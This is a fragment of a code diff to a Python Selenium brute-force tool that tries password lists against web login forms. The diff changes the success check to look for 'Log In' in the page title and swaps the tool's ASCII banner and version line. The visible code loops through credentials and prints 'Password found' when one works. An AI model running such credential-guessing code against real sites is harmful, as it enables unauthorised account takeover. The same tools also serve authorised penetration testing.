@@ -99,22 +99,9 @@ def brutes(username_list, username_selector, password_selector, login_btn_select
                 Sel_pas.send_keys(password)
 
                 
-                # t.sleep(1)
-                # Check for successful login by observing changes in the page
-                # You may need to customize this based on the behavior of the website
-                # if "Login Successful" in browser.page_source:
-                # if browser.find_elements(By.CSS_SELECTOR, success_selector):
-                #     print(color.BLUE +'------------------------')
-                #     print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE +
-                #           ' for user: ' + color.GREEN + username.strip())
-                #     print(color.BLUE +'------------------------')
-                #     # browser.quit()
-                #     exit()
-                #     break
-                
 
                 #the program terminates after the coreect user and password is found
-                if "Sign in" not in browser.title: #this line should be written according to the website being used
+                if "Log In" not in browser.title: #this line should be written according to the website being used
                     print(color.BLUE + '------------------------')
                     print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE + ' for user: ' + color.GREEN + username.strip())
                       
@@ -142,14 +129,13 @@ def brutes(username_list, username_selector, password_selector, login_btn_select
 success_selector = "#content > nav > form > div > input"
 
 banner = color.BOLD + color.RED +'''
-  _    _       _       _
- | |  | |     | |     | |
- | |__| | __ _| |_ ___| |__
- |  __  |/ _` | __/ __| '_ \\
- | |  | | (_| | || (__| | | |
- |_|  |_|\__,_|\__\___|_| |_|
-  {0}[{1}-{2}]--> {3}V.1.0
-  {4}[{5}-{6}]--> {7}coded by Metachar
+   _____                      
+ |__  /  /////    |\\       /||   /////   |\\   ||
+   / /  /    \\   | |\\    //||  /    \\  ||\\  ||
+ / /_  /  ////\\  | | \\  // || /  ////\\ || \\ ||  
+/____|/ _/     \\ | |  \\//  ||/ _/     \\||  \\||
+  {0}[{1}-{2}]--> {3}V.2.3
+  {4}[{5}-{6}]--> {7}coded by 
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
 if options.username_list == None:
